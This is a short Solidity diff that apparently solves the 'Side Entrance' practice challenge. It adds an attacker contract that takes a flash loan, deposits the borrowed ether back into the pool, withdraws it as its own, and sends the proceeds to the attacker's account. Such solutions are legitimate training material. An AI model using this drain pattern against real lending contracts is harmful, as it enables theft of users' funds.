@@ -40,3 +40,27 @@ contract SideEntranceLenderPool {
         }
     }
 }
+
+contract AttackerContract {
+    SideEntranceLenderPool public lendingPool;
+
+    constructor(SideEntranceLenderPool lendingPool_) {
+        lendingPool = lendingPool_;
+    }
+
+    function execute() external payable {
+        lendingPool.deposit{value: msg.value}();
+    }
+
+    function attack(uint256 amount) external {
+        lendingPool.flashLoan(amount);
+        lendingPool.withdraw();
+
+        //transfer to attacker's EOA
+        (bool success,) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+    }
+
+    // fallback function
+    fallback() external payable {}
+}
